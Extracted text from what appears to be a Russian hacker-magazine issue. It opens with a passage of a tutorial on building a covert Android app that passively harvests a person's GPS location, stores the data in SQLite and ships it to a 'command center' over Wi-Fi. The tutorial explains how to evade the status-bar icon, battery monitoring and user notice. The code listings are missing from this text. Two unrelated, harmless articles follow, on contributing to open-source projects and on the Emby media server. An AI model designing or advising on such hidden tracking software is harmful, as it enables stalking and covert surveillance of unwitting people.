собирают абсолютно все игроки рынка геолокационных сервисов.
   Ok, Google, вырубаем GPS и вынимаем симку, за-
пускаем «Карты» и... внезапно снова видим свое по-
ложение. Оказывается, информации об окружающих
точках Wi-Fi вполне достаточно для определения ме-
стоположения смартфона, пускай и не такого точного.
В этой связи примечателен давний скандал с «кар-
томобилем» Google, который тихо-мирно себе ездил
и снимал улицы, попутно собирая названия всех точек                                              WARNING
доступа Wi-Fi. Тогда Google заявляла о некоем техни-
ческом сбое (!), но мы-то знаем...                               Вся информация предо-
                                                                          ставлена исключительно  Одним словом, смартфон почти всегда сможет                                                                          в ознакомительных целях.
определить свою ориентацию в родной Солнечной си-      Ни редакция, ни автор
стеме, чем мы и воспользуемся.                                не несут ответственности
                                                                          за любой возможный вред,
                                                                     причиненный противоза-
ОПЕРАЦИЯ «СПЕКТР»                                     конным использованием
Театр начинается с вешалки, а приложение Android —     материала данной статьи.
с манифеста. Для доступа к GPS-приемнику необхо-
димо добавить тег в секцию uses-permission:





Константа  ACCESS_FINE_LOCATION  задает  высокий  уровень  точности
для определения местоположения пользователя. Есть еще ACCESS_COARSE_
LOCATION для более грубой геолокации, но нам она принципиально не инте-
ресна. К слову, приложение, которому было выдано полномочие fine, автома-
тически получает еще и полномочие coarse.
  В Android для работы с геолокацией используется специальный интерфейс,
предоставляемый системным объектом LocationManager:





Вторая геосоставляющая — LocationProvider, набор источников данных, каж-
дый из которых отражает отдельную технологию поиска местоположения. Так,
GPS_PROVIDER основывается на данных, полученных со спутников, NETWORK_
PROVIDER шпионит за вышками сотовой связи и Wi-Fi.
   Наверное, в твоей голове
уже созрел коварный план —
периодически   запрашивать
координаты у GPS_PROVIDER
и NETWORK_PROVIDER  (на-
пример, с помощью фонового
сервиса) и отправлять их в ко-
мандный центр. Такое решение
в лоб, конечно, имеет право
на жизнь, но разве популярней-
ший журнал о безопасности
стал бы о нем писать? Во-пер-
вых,  это заметно — любое
включение GPS отображает-
ся в статусной строке значком
(рис. 1); во-вторых, это баналь-
но сажает батарею, что может
заставить  владельца  заду-   Рис. 1. GPS за работой
маться и поискать прожорли-
вое приложение; и, в-третьих,
фоновый  трафик  прекрасно
виден в системном журнале.
   Специально для нас Google
придумала отдельный провай-
дер —  PASSIVE_PROVIDER,
который  получает информа-
цию о местоположении только
в том случае, если ее запра-   Рис. 2. Первый запуск после загрузки устройства
шивает  другое  приложение.
Благодаря этому наш шпион
будет  получать  обновления
скрытым образом, без акти-
вации какого-либо источника
LocationProvider. Иными  сло-
вами, стоит пользователю за-
пустить  карту, клиент соци-
альной сети, выйти в интернет,
отправить сообщение и далее   Рис. 3. Второй запуск после сеанса в Google Maps
по списку, как наше приложе-
ние уже будет в курсе (рис. 2–3). Обратной стороной пассивности (и скрыт-
ности) является полное доверие к получаемым данным, мы никак не сможем
проверить их достоверность.

КООРДИНАТЫ «СКАЙФОЛЛ»
Для  получения  координат  от  источника  данных  существует  метод
getLastKnownLocation:





Возвращаемый объект Location содержит всю информацию о местонахожде-
нии, которую поддерживает источник. Он может включать в себя время, точ-
ность полученных координат, широту, долготу, высоту над уровнем моря (вот
оно, вмешательство в частную жизнь!) и скорость. Все эти свойства доступны
через геттеры:
Как уже отмечалось, ни PASSIVE_PROVIDER, ни getLastKnownLocation не за-
прашивают у LocationProvider обновление местоположения. Если смартфон
долго не обновлял текущую позицию, полученное значение может быть неак-
туальным или вовсе не существовать (например, сразу после загрузки).
   Если ты снова подумал об использовании фонового сервиса для «дерга-
ния» PASSIVE_PROVIDER, спешу тебя огорчить: все гораздо проще. Наш вы-
бор — широковещательный приемник (если не знаешь, что это, срочно загля-
ни в сентябрьский «Хакер» или читай дальше).

НА СЕКРЕТНОЙ СЛУЖБЕ ЕЕ ВЕЛИЧЕСТВА
Вкратце напомню: в качестве механизма передачи сообщений на уровне систе-
мы намерения (Intent) способны отправлять структурированные данные от про-
цесса к процессу (например, информацию от GPS-модуля). Для отслеживания
таких данных и реакции на них реализуются специальные объекты — широко-
вещательные приемники. Основное их достоинство (для нас) — они срабаты-
вают даже тогда, когда приложение находится в фоне, а некоторые (например,
прием СМС) вообще не требуют запуска родительского приложения.
   Каркас нашего приемника представлен ниже:





Метод onReceive будет срабатывать всякий раз при изменении координат
устройства, но сначала приведенный приемник необходимо зарегистриро-
вать в манифесте:
Далее мы должны настроить частоту срабатывания приемника, иначе любое
сколь угодно малое движение объекта наблюдения в пространстве попросту
заDoSит наш жучок координатами. В тестовом примере поместим соответ-
ствующий код в метод onCreate главной (и единственной) активности:





Метод requestLocationUpdates, используемый для инициирования регулярных
обновлений местоположения, принимает в качестве первого параметра на-
звание конкретного типа провайдера — PASSIVE_PROVIDER. Далее следует
минимальный интервал и дистанция между обновлениями. В приведенном
коде обновления координат будут поступать не чаще, чем раз в минуту (60 000
мс), и только в случае перемещения объекта на 25 м от последней точки. Поче-
му эти числа нужно выбирать как можно аккуратнее, читай на врезке.
   Последний параметр — ожидающее (или отложенное) намерение, которое
и будет передано в широковещательный приемник LocationUpdateReceiver.
Объекты PendingIntent используются для упаковки намерений, срабатываю-
щих в ответ на будущие события, как, например, в нашем варианте — получе-
ние координат.
  К слову, чтобы прекратить выполнение обновлений, вызывается метод
removeUpdates:



Так как наша активность не предполагает
никакого взаимодействия с пользователем,
не содержит интерфейса, да и вообще ра-
ботает негласно, логично будет ее закрыть,
вызвав метод  finish. При этом приемник
LocationUpdateReceiver продолжит свою ра-
боту как ни в чем не бывало. Кстати, к статье
я прикладываю небольшой исходник (есте-
ственно, только в мирных отладочных целях),
в котором координаты выводятся на экран
(рис. 4) в виде всплывающих сообщений
(класс Toast).

И ЦЕЛОГО МИРА МАЛО
Итак, у нас есть множество координат объ-
екта, то есть трекинг его передвижения.
Возникает вопрос: что с этим массивом ин-
формации делать и как его хранить? В сен-
тябрьском выпуске «Хакера» была отличная
статья, касающаяся темы хранения пользо-
вательской информации. Для нашей цели
                                                    Рис. 4. Информация для шпионаподойдет любой из описанных методов —
Shared Preferences, Internal/External Storage,
SQLite Database или даже Cache Files.
  Я выбрал базу SQLite со следующей таблицей:
О том, как вносить записи в базу SQLite, «Хакер» рассказывает регулярно
(да ладно, когда это мы регулярно об этом писали? :) — Прим. ред.), так что
я не буду касаться этой скучной темы, а вот об отправке накопленных данных
поговорим.
   Конечно, полученные координаты можно вовсе не помещать в базу данных,
а отправлять сразу же, по факту, но весьма высока вероятность, что доступа
в интернет в отдельно взятый момент времени не окажется. Кроме того, как мы
уже говорили, фоновая передача данных довольно заметна (предполагаем,
что у объекта обычный нерутованный смартфон). Другое дело Wi-Fi — отлич-
ная скорость, малое время отклика, да и вряд ли кому-нибудь придет в голову
изучать трафик (бесплатно же!).
  Следующий вопрос — что отправлять? Извлекать каждую строчку из базы
и посылать? Можно, но как-то некрасиво, не по-хакерски, что ли. А что, если
послать сразу всю базу в виде двоичного файла? Физически база находится
в приватной директории приложения и доступна только нам, содержимое та-
блиц — только числа (размер будет минимальным), Wi-Fi — высокоскоростное
подключение. В общем, сплошные плюсы.
   Ну а чтобы довести идею до высот перфекционизма, перед отправкой по-
местим файл базы в архив, благо файлы SQLite очень хорошо сжимаются. Пря-
мо из коробки Android в паре с Java поддерживает работу с архивами формата
ZIP. Для архивирования произвольного файла соорудим функцию:
Путь к базе данных можно получить следующим образом:




Здесь «com.example.gpsspy» — имя пакета нашего примера, а «имя_базы» за-
дается при ее создании (без расширения). Таким образом, приведенную выше
функцию можно использовать так:





Чтобы не было никаких подвисаний в программе, процедуру архивирования
рекомендую вынести в фоновую задачу (AsyncTask).
   Полученный архив можно смело отправлять по сети. Механизм доставки
будет зависеть от выбранной технологии — это могут быть сокеты, локальная
шара, web-интерфейс, анонимный FTP, Wi-Fi Direct и тому подобное.
  При использовании сокетов подход может быть таким:
В любом случае потребуется разрешение работы в интернете:





После передачи файла базу необходимо очистить. Сделать это можно с по-
мощью традиционной SQL-команды DELETE * FROM имя_таблицы, но размер
файла в этом случае не уменьшится, либо можно стереть сам файл:





При следующем обращении к базе данных Android автоматически создаст но-
вый файл.

ЛУННЫЙ ГОНЩИК
Мы определились с тем, что и как будем посылать, осталось только решить
когда. И здесь нам снова поможет механизм трансляции намерения с помо-
щью широковещательного приемника, только системного.
   Класс WiFiManager представляет собой сервис для работы с Wi-Fi в Андро-
иде. Он может применяться как для установки соединения с точкой доступа,
так и для отслеживания состояния подключения. Так как мы используем пас-
сивный алгоритм работы, то единственное, что нужно сделать, — дождаться
активного подключения к точке Wi-Fi и попробовать отправить файл.
  Официальный SDK от Google определяет несколько действий для сраба-
тывания широковещательного приемника при изменении статуса Wi-Fi: WIFI_
STATE_CHANGED_ACTION,   SUPPLICANT_CONNECTION_CHANGE_ACTION
и NETWORK_STATE_CHANGED. Описывать их смысла нет, так как они баналь-
но не работают. Нет, все компилируется и запускается, но приемник не сраба-
тывает. Причина такого поведения мне неизвестна (может быть, Google посте-
пенно превращается в Microsoft?).
  В любом случае ситуация вовсе не безвыходная. Независимо от вида
соединения  (Wi-Fi, 3G, GPRS/EDGE) в Android предусмотрено действие
CONNECTIVITY_CHANGE, которое срабатывает при включении и отключении
передачи данных. Используя класс ConnectivityManager, предназначенный
для управления сетевыми подключениями, мы можем определить тип подклю-
чения, что нам и нужно.
   Итак, добавляем в манифест разрешения для доступа к состоянию сетевых
интерфейсов:





Определяем широковещательный приемник:





Наконец, код самого приемника:
Здесь в цикле перебираются все активные подключения, и, если найдено
активное Wi-Fi, базы координат начинают передаваться в командный центр.
Отдельно отмечу, что при подключении к точке Wi-Fi данный приемник может
сработать несколько раз, имей это в виду.

ЗАВТРА НЕ УМРЕТ НИКОГДА
Сегодня мы познакомились с пассивным геопозиционированием в Android,
научились архивировать и отправлять базу данных SQLite по сети, а также по-
знакомились с разными видами широковещательных приемников. Одним сло-
вом, с основными инструментами тайного агента!

Шаровая молния

Данные    GPS,    возвращаемые    методом
getLastKnownLocation  или  широковещательным
приемником, не изменятся, пока хотя бы одна
программа не  запросит обновление  местопо-
ложения. В итоге при первом запуске эмулятора
getLastKnownLocation, скорее всего, вернет  null,
а приемник и вовсе откажется срабатывать.
   Чтобы это исправить, можно воспользоваться                                                   Засылаем координаты
следующим трюком:                                  в эмулятор
Поместив это код в OnCreate активности, мы заставим приложение непрерыв-
но опрашивать координаты, что приведет к срабатыванию нашего же широко-
вещательного приемника. Разумеется, после отладки этот код на стероидах
нужно выжечь раскаленным железом. Не забудь!



УМРИ, НО НЕ СЕЙЧАС
При настройке requestLocationUpdates мы ука-
зывали минимальный промежуток времени
и приемлемое расстояние для срабатывания
широковещательного приемника.  Android 5
очень внимательно следит за всеми приложе-
ниями, запрашивающими координаты (даже
в пассивном режиме), и выискивает наиболее
прожорливые. Чтобы не попасть в топ, старай-
ся устанавливать как можно большие значе-
ния для минимального временного интервала
и дистанции между обновлениями.

ТОЛЬКО ДЛЯ ТВОИХ ГЛАЗ
Чтобы не было совсем уж просто, я намеренно
не стал выносить функциональность в фоно-  На эмуляторе мы одни
вый сервис. В мартовском «Хакере» я уже рас-
сказывал о том, как работает подобный сервис
и механизм сигнализаций. Эти технологии вполне сгодятся для создания не-
заметного фонового сервиса. Там же ищи информацию о «выживаемости» по-
сле перезагрузки устройства.

ИЗ РОССИИ С ЛЮБОВЬЮ
Геокодирование в Android позволяет переводить координаты (широту и дол-
готу) в уличный адрес и наоборот. Чтобы получить строку с адресом, можно
воспользоваться этой функцией:
Метод getFromLocation вернет список адресов, которые так или иначе совпа-
дают с переданными координатами. В рассмотренном примере берется толь-
ко первый адрес, из которого извлекаются все дополнительные строки, после
чего добавляется область, почтовый индекс и страна. Точность этой информа-
ции зависит от детализации карт региона в сервисе Google Maps.

БРИЛЛИАНТЫ НАВСЕГДА
Для перевода старого доброго UNIX-time в формат, понятный нам и шпионам,
можно использовать Java-объект «Календарь» (Calendar):
КОДИНГ
КАРЬЕРА
С ОТКРЫТЫМ
ИСХОДНЫМ
КОДОМ
КАК СТАТЬ
УЧАСТНИКОМ
ОПЕНСОРСНОГО
ПРОЕКТА, ДАЖЕ
ЕСЛИ НЕ УМЕЕШЬ
ПИСАТЬ КОД





  Сергей Бронников,
       OpenVZ
Чтобы участвовать в опенсорсных проектах, не нужно
даже уметь программировать, но, однажды окунувшись в
мир свободного софта, ты можешь стать опытным спецом
и найти подходящую работу. Вот десять советов, которые
помогут тебе обрести свой путь.

Анестезиолог Кон Коливас разработал собственную версию планировщика
задач для ядра Linux, потому что существующая реализация была адаптиро-
вана под серверные задачи и плохо справлялась с пользовательскими.
   Алексей Кузнецов, который по воле случая превратился в Linux-хакера, сме-
нил свою профессию с физика-теоретика на системного программиста.
   ИТ-журналист Петр Семилетов параллельно с основной работой уже де-
сять лет разрабатывает свой текстовый редактор Tea с открытым исходным
кодом.
   Леся Новасельская, получившая специальность патологоанатома, участву-
ет в тестировании проекта c открытым исходным кодом.
  Подобных примеров множество. Всех этих людей объединяет одно — они
нашли способ реализовать свои интересы в опенсорсных проектах и участву-
ют в них и для удовольствия, и для получения опыта. Сложился некий миф, что
открытый проект — это только для программистов, причем тех, у кого уже есть
большой опыт в разработке. Но это не так. Открытый проект — не только напи-
сание исходного кода, но и тестирование, техническая поддержка, написание
документации, маркетинг и так далее. А еще это отличный шанс приобрести
опыт, построить карьеру и получить удовольствие от общения с единомыш-
ленниками.
   Согласно опросу сайта opensource.com, основное препятствие для участия
в открытом проекте — желающие просто не знают, как к нему присоединиться.
Мы предлагаем несколько универсальных способов решения этой проблемы.

ПИШИ НОВЫЙ КОД
Начнем с банального. Не думай, что тебе необходимо быть гением. Если зна-
ешь язык программирования, который используется в открытом проекте, —
реализуй новые функции и предложи включить твои наработки в основную
ветку. Все разработчики в проекте независимо от опыта и квалификации мо-
гут помочь с кодом. Конечно, в одних проектах более лояльны к новичкам, в
других — менее. Но если твои наработки принесут пользу другим людям, то
код не останется незамеченным.
  Для каждого проекта характерны свои технические процессы, поэтому уз-
най о них побольше, прежде чем предлагать свой вариант. Например, в про-
екте PostgreSQL жестко регламентированы все процессы: изменения в коде
отправляются в виде патча в рассылке основным разработчикам, которые тща-
тельно изучают все изменения. С другой стороны, есть и иные типы проектов,
как, например, Parrot, где программисты могут коммитить в основной репози-
торий. Если в проекте используется GitHub, возможно, процессы поставлены
через pull request, то есть через запросы на включение сделанных изменений.
В общем, нет двух одинаковых проектов.
   Всякий раз, когда переписываешь код, не забывай, что ты работаешь в ко-
манде, поэтому делай все возможное, чтобы твой стиль совпадал со стилем,
принятым в проекте. В противном случае это то же самое, что сказать: «Мне не
нравится ваш стиль, вы должны делать так же, как я».

ПРИОРИТИЗИРУЙ БАГИ
Безусловно, код — основа любого открытого проекта, но его написание не
единственный способ участия. Технической поддержке зачастую уделяют не-
достаточно внимания в погоне за реализацией новых функциональных воз-
можностей и исправлением ошибок. А ведь именно это и есть те области, ко-
торые позволяют даже новичкам войти в проект.
   Например, у проекта OpenVZ есть полностью открытая система работы с
дефектами — bugs.openvz.org, где собраны все известные (исправленные и
неисправленные) проблемы за все время существования проекта (без малого
десять лет). Баг-трекер — один из механизмов коммуникации между разра-
ботчиками и пользователями. Постоянная работа с текущими запросами дает
отличную возможность внести свой вклад в проект. Для работы с системой
могут понадобиться специальные права доступа, которые тебе предоставит
менеджер проекта, следуя принципам меритократии.

ТЕСТИРУЙ ПРОМЕЖУТОЧНЫЕ ВЕРСИИ
Опрос в Интернациональном клубе тестировщиков ПО показал, что интерес к
тестированию ПО с открытым исходным кодом у профессиональных тестиров-
щиков есть. Многие хотели бы поучаствовать в таких проектах, но не знают, с
чего начать. В свою очередь, в любом проекте, даже коммерческом, всегда не
хватает тестировщиков. Обнаружение и сортировка багов может значитель-
но сэкономить разработчикам время на поиск проблемы. Если пользователь
пишет: «Программа не работает, когда я делаю такие-то шаги», не поленись
разобраться в том, чем вызвана эта проблема. Проблема повторяется? Ты мо-
жешь воспроизвести ее, сделав ряд конкретных шагов? Сузить круг подозре-
ваемых до конкретного браузера или дистрибутива? Даже если ты не знаешь
истинную причину проблемы, информация об уже проделанной тобой работе
поможет разработчикам справиться с ней. Независимо от того, что тебе уда-
лось выяснить, добавь свои комментарии к багу, чтобы все могли с ними озна-
комиться.
  По своему опыту могу сказать, что у открытых проектов вечно не хватает
ресурсов, чтобы хорошо протестировать новую функциональность. Поэтому
перед тем, как добавлять серьезные изменения в основную ветку репози-
тория исходного кода, проект старается привлечь как можно больше людей
для тестирования. Такая практика так и называется — призыв к тестированию
(call for testing). У владельцев проекта никогда не будет столько аппаратных и
программных конфигураций, сколько у сообщества. Например, разработчи-
ки проекта OpenBSD анонсируют появление новой функциональности в ново-
стях, чтобы привлечь к ней внимание тестировщиков и пользователей. То же
самое делает и проект OpenVZ.
   Ты можешь принять участие в тестировании и убедиться, что продукт рабо-
тает на той или иной платформе. Скорее всего, тебе придется собрать и уста-
новить новый билд и протестировать продукт. Ты принесешь особенно ценную
информацию проекту, если будешь использовать нестандартные аппаратные
средства. Если ты подтвердишь, что сборка работает и при таких условиях, это
поможет руководителям проекта определить текущий статуса релиза.

ПИШИ ТЕСТЫ
В большинстве проектов используются программные комплексы, предназна-
ченные для тестирования кода, и любой из них предусматривает возможность
добавления в него новых тестов. Используй такие тестовые инструменты, как
gcov для C, чтобы установить те области исходного кода, которые нельзя про-
тестировать имеющимися тестами. Затем добавь соответствующий тест, что-
бы иметь возможность протестировать необходимую функциональность.

ИСПРАВЛЯЙ БАГИ И ДОБАВЛЯЙ НОВЫЕ ФУНКЦИИ
Патч с исправлением проблемы или добавляющий необходимые тебе функ-
ции — это своего рода классический способ вовлечения в открытый проект
(с этого началось вообще все движение за свободное ПО). Этот способ ре-
комендует и известный мейнтейнер сообщества Linux Джеймс Боттомли (он
же — технический директор отдела серверной виртуализации компании Odin)
тем, кто хочет принять участие в Linux-проекте, но не знает как. Обычно он при-
водит в пример случай, когда ему понадобилось изменить функциональность
SIP-клиента в Android. Обнаружив, что такая возможность отсутствует, он сде-
лал патч и отправил в проект SIPdroid.
  При разработке новых функций неплохо также добавить тест для тестиро-
вания той части кода, которую ты исправил; некоторые проекты требуют, чтобы
все исправления дефектов сопровождались соответствующими тестами. Веди
записи по мере того, как осваиваешь незнакомый код. Даже если ты не можешь
справиться с багом, опиши в тикете то, что тебе удалось о нем выяснить. Это
поможет тем участникам команды, которые будут работать с багами после тебя.
ПОМОГАЙ ПОДДЕРЖИВАТЬ ИНФРАСТРУКТУРУ ПРОЕКТА
Тебе интересна область DevOps? Это направление сейчас очень популярно.
Хороших инженеров DevOps в России очень трудно найти, мы это знаем на
собственном опыте. Получить опыт можно в проектах, в которых ведется от-
крытая разработка инфраструктуры. Это такие проекты, как Wikipedia и Fedora
Linux. OpenVZ только делает в этом направлении первые шаги.
   Настройка процесса непрерывной интеграции для компонентов проекта,
пакетирование компонентов для Linux-дистрибутивов, автоматическая на-
стройка окружения разработчика — все это входит в задачи DevOps.

ПИШИ И ПЕРЕВОДИ ДОКУМЕНТАЦИЮ
Ведение документации — рутинная составляющая любого проекта, которой
зачастую пренебрегают. Кроме того, проблемы с документацией часто могут
быть вызваны тем, что она написана с точки зрения людей, хорошо знающих
проект, а не тех, кто только знакомится с ним.
   Если при чтении документации по проекту тебя когда-нибудь посещала
мысль: «Такое ощущение, что ее написали так, как будто я уже знаю, как поль-
зоваться программой», то ты понимаешь, о чем речь. Очень часто взгляд со
стороны позволяет выявить недостатки в текущей документации, которые мо-
гут не заметить непосредственные участники проекта. К тому же в динамич-
но развивающихся проектах документация быстро устаревает, и ее требуется
поддерживать в актуальном состоянии.
   Если ты по какой-то причине думаешь, что заниматься этим «несерьезно»,
то ты ошибаешься. Нет «серьезного» или «несерьезного» вклада в открытый
проект. К примеру, разработчик OpenBSD (в то же время и сотрудник CERN)
Инго Шварц (Ingo Schwarze) написал утилиту mandoc, которая теперь исполь-
зуется для форматирования страниц документации не только в OpenBSD, но и
во FreeBSD, NetBSD, DragonFly BSD. Попутно он привел в порядок (http://www.
openbsd.org/papers/bsdcan15-mandoc.pdf) форматирование существующих
страниц документации в проекте. Так что все зависит от того, что интересно
тебе. Если интересно — берись и делай!

ПОМОГАЙ ДРУГИМ ПОЛЬЗОВАТЕЛЯМ
Лучший способ сплотить команду — это помогать другим. Для дальнейшего
успеха проекта особенно важно отвечать на вопросы, в частности на вопросы
новичков. Это время не будет потрачено зря, даже если кто-то задает вопрос,
на который можно найти ответ, перечитав необходимую документацию. Кроме
того, ты получишь нового благодарного и активного участника своей команды.
Все с чего-то начинают, а любому проекту необходим постоянный приток ка-
дров, чтобы он продолжал развиваться.
РЕКЛАМИРУЙ ЛЮБИМЫЙ ПРОЕКТ
Если у тебя есть блог, делись своим опытом, который ты получил в проекте.
Расскажи о проблемах, с которыми ты столкнулся при использовании ПО, и
как тебе удалось их решить. Так ты сможешь убить двух зайцев сразу: поддер-
жать внимание своих коллег к проекту и создать полезную базу информации
для тех, кто присоединится к нему в будущем и будет искать в Сети ответы
на уже описанные тобой вопросы. Блог, рассказывающий о твоих технических
достижениях и изысканиях, — это еще и отличный способ поделиться реаль-
ным опытом разработки и решения технических проблем, который может при-
годиться при поиске новой работы. Во многих проектах есть агрегаторы за-
писей из блогов участников проекта, традиционно их называют «планетами»:
планеты Linux kernel, Perl, OpenVZ, freedesktop, GNOME, Debian и другие.

ДЕЛАЙ ДИЗАЙН
Дизайн — это бич большинства открытых проектов. Скучные сайты и невзрач-
ные логотипы сопровождают проекты просто потому, что технические люди
в основном зациклены на реализации, а не на внешнем виде. Поэтому уча-
стие дизайнеров крайне приветствуется. Пользователи сайта StackExchange
попробовали ответить на вопросы «как графический дизайнер может внести
вклад в открытый проект», «что мотивирует дизайнера участвовать в откры-
том проекте», но мнения их разошлись. Дизайнеры из компании Red Hat тоже
осознали необходимость более активного участия дизайнеров в открытых
проектах и попробовали создать сайт, который поможет открытым проектам
и дизайнерам найти друг друга, но о случаях успешного применения проекта
пока не известно.
  Ищи задачи, которые интересны тебе и полезны проекту, и пытайся их ре-
шить. Способы участия могут быть разными, иногда они описаны на специ-
альных страницах: OpenStack, OpenVZ, FreeBSD. Само наличие у проекта та-
кой страницы говорит о том, что он открыт для участия других людей.
   Чтобы подкрепить все наши слова фактами, мы собрали отзывы трех лю-
дей, которые получили профессиональный опыт в открытых проектах.

АЛЕКСАНДР ЮРЧЕНКО, РАЗРАБОТЧИК
В КОМПАНИИ «ЯНДЕКС»
На свою первую серьезную работу за деньги (раз-
работчик встраиваемых систем) я пришел, уже боль-
ше года считаясь официальным разработчиком ядра
бесплатной операционной системы OpenBSD. Офи-
циальным — в смысле у меня был доступ на запись в
репозиторий. А до этого еще с год я был «зрителем»,
присылающим патчи разработчикам.
  Должен сказать, что участие в подобном проекте дает колоссальный опыт.
В хорошем крупном open source проекте есть все, что обычно требуют от раз-
работчика на собеседовании: и грамотное проектирование, и хорошее коди-
рование, и навык работы с системой контроля версий и баг-трекером, а так-
же peer review, работа в команде и т. д. и т. п. Таким образом, «поварившись»
год-другой в такой атмосфере, можно запросто вырасти до уровня, который
соответствует позиции Senior developer.
   Собственно, со мной так и было. Я не имел никакого формального опыта
работы (по трудовой), но меня сразу взяли старшим разработчиком. А после
первой недели испытательный срок был уменьшен с трех месяцев до нуля.

КИРИЛЛ ГОРКУНОВ,
РАЗРАБОТЧИК ПРОЕКТОВ OPENVZ И CRIU
Попал в OpenVZ достаточно случайно. По работе за-
нимался в основном прикладным программирова-
нием, практически не имеющим точек пересечения с
системным. В какой-то момент приобрел свой первый
64-битный ноутбук (Acer с AMD Turion 64), ну и посколь-
ку Windows 64-битной под руками не было, поставил
Gentoo. С Linux до того момента знакомства практи-
чески не имел, так, поиграться ставил какой-то древ-
ний Red Hat, но он меня особо не впечатлил, да и для
решения текущих рабочих задач эта операционка не подходила. Под Gentoo
ноут более-менее работал, но некоторых драйверов не было в стандартной
поставке ядра, так что пришлось собирать свое ядро из исходников.
   Тут я и словил первый баг, правда, не в самом ядре, а в программе фор-
мирования конфигурации ядра. Порыскал по Сети — решения проблемы нет,
ну и рискнул сам попробовать исправить. Оказалось, пришлось разбираться
со множеством смежных задач (как собирается ядро, какие инструменты ис-
пользуются и прочее). Сделал патч, выслал в рассылку. К моему удивлению,
мейнтейнеры ядра отнеслись очень благосклонно даже к такому «кривому»
патчу (забегая вперед, скажу, что его пришлось переделать, так как патч был
отвратительный, просто не стали сразу давать «от ворот поворот»), не было ни
одного смешка в сторону новичка: объяснили, что и как, и показали, как делать
правильно.
  Дальше заинтересовало само ядро — как работает, какие алгоритмы ис-
пользуются. В этом отношении открытость проекта оказывает неоценимую
услугу: можно посмотреть, как решаются те или иные задачи (не какие-то тео-
ретические, а реальные). Нередко возникал вопрос «а почему так, а не эдак»,
и вот тут крайне полезно иметь обратную связь с автором кода. Открытые спи-
ски рассылки не только позволяют спросить у разработчиков, что и как, но, что
более важно, служат чем-то вроде базы знаний — всегда можно поискать в
архивах обсуждения проблем и методы их решений. Для начинающего про-
граммиста без опыта работы такое окружение — просто благодатная почва,
чтобы попробовать свои силы, понять, «а надо ли это все мне».
  Примерно так было и со мной: несколько лет правил что-то в коде, высылал
патчи, получал по рукам за кривой код, ну и одобрения, если патч был правиль-
ным и красивым. Такой опыт фактически бесценен. И можно быть уверенным:
если у тебя начинает что-то получаться, то тут же появятся предложения о ра-
боте. Я так и пересекся с разработчиками ядра Linux из OpenVZ. Ну а дальше
решили работать вместе над ядром OpenVZ и смежными программами, не за-
бывая, конечно, и о ванильном ядре.
   Открытость проекта — чрезвычайно важное подспорье при обучении прак-
тическому программированию, но надо понимать, что проект проекту рознь и
открытость сама по себе абсолютно не гарантирует качества кода. Если зака-
чать свой код на Гитхаб, он не становится от этого хорошим кодом.

АЛЕКСАНДР ПОЛЯКОВ, РАЗРАБОТЧИК
Я думаю, в моей истории ничего оригинального нет.
Как это происходит обычно — начинаешь использо-
вать какой-то софт, и внезапно оказывается, что хоте-
лось бы, чтобы что-то в нем работало не совсем так,
или чего-то не хватает, или есть противные косяки. В
случае опенсорса есть возможность исправить это
самому. Так было с оконным менеджером dwm, в ко-
тором меня раздражала конфигурация через config.h
c перекомпиляцией: сначала я добавил конфиг через
xrdb, потом click to focus и так далее. Такие изменения не соответствовали ми-
нималистичным гайдлайнам проекта, поэтому пришлось делать форк.
  C DragonFly BSD примерно то же самое: завлекательные тексты на сайте
звучали интересно, FreeBSD надоела, но внезапно оказалось, что там плохая
поддержка языков, отличных от английского, и управления энергопотреблени-
ем (ACPI). Пришлось заняться портированием необходимых участков кода из
более свежей версии FreeBSD. Сильно помогли другие разработчики c IRC-ка-
нала, объясняли, что к чему, и помогали разбираться с проблемами. Там я по-
лучил кое-какой опыт разработки ядра и системных библиотек. Еще удалось
на этом заработать немного денег — нашелся человек из Москвы, который
использовал DragonFly BSD в продакшене и тоже что-то там хотел подкрутить
в ACPI. Нашел меня через git log, связался по почте.
  В OpenBSD я только по мелочи какие-то патчи кидал — в cwm что-то допи-
ливал для удобства (в wm’ах-то я уже был спец), в ksh поправил пару косяков и
улучшил vi mode. В этом проекте отношение к новым контрибьюторам не са-
мое лучшее — предполагается, что ты самостоятельно во всем разберешься
и только после этого будешь писать в рассылку. Порог вхождения высокий,
выживают только самые стойкие, зато код получается хороший.
  Еще я участвовал в 9front: доработал драйвер для Wi-Fi и уже знакомый мне
ACPI. У них, наверное, самая маленькая работающая реализация интерпре-
татора AML. Да и само ядро довольно компактное (в сравнении с «нормаль-
ными» ОС), поэтому разбираться проще. Хвастался этим на собеседовании,
насколько помогло (или наоборот) — не знаю.
   Вот так вот можно получить опыт в открытых проектах. Главное — не боять-
ся присылать кривой код (бывает у всех), сохранять спокойствие (когда его об-
ругают) и выбирать проекты, которые тебе действительно интересны. И опыт
получишь, и удовольствие. Еще есть шанс, что работодатель сам тебя найдет
по коммитам или профилю в Гитхабе (привет, Гугл!).
UNIXOID


               ЗНАКОМИМСЯ
               С МЕДИАСЕРВЕРОМ
                EMBYСВОЯ




                                                                               Мартин
                                                                                            «urban.prankster»
                                                                                  Пранкевич
                                                                                                    martin@synack.ruСИНЕМА
Количество устройств в домах растет постоянно, база
фильмов и музыки пухнет на глазах, медиаконтент обычно
разбросан на нескольких девайсах. В итоге со временем
становится сложно что-то найти и использовать. А значит,
пришло время правильно построить свою медиаинфра-
структуру. Кто-то собирает все медиафайлы на NAS, кто-
то идет дальше и подыскивает решение для организации
домашнего кинотеатра. Среди тех, что распространяются
под свободной лицензией, Emby отличается своей проду-
манностью и функциональностью.


ВОЗМОЖНОСТИ EMBY
Emby — медиасервер с открытым исходным кодом, позволяющий органи-
зовать трансляцию и получить доступ к медиаконтенту (видео, аудио, фото)
с любой точки и любого устройства, включая мобильные на базе Android, iPad/
iPhone, Windows Phone или при помощи браузера через Emby Web Client. Кли-
ентские приложения Emby TV Apps доступны для платформ Android TV, Amazon
Fire TV, Chromecast, Roku, Xbox, Home Theater Computers и других. Контент ав-
томатически преобразуется в оптимальный для воспроизведения на конкрет-
ном устройстве вид. Кроме локальных аудио, видео и графических файлов,
Emby позволяет просматривать онлайн-телевидение и видео с ресурсов вро-
де YouTube. Режим кинотеатра вместе с возможностью автоматически вос-
производить трейлеры и произвольные заставки перед просмотром создает
иллюзию зрительного зала. Для более привлекательного просмотра можно
активировать генерацию рисунков сцен. Медиаданные сортируются по жанру,
коллекциям, поддерживается понятие «сериал». Сервер после сканирования
файлов автоматически загружает постеры, субтитры и прочие метаданные
из баз данных интернета, но поддерживаются также NFO-файлы.
   Есть режим автоупорядочивания, когда все новые файлы вначале загру-
жаются в определенную папку. Далее Emby автоматически сортирует контент,
перемещая по своим местам, переименовывая по указанному шаблону. Пред-
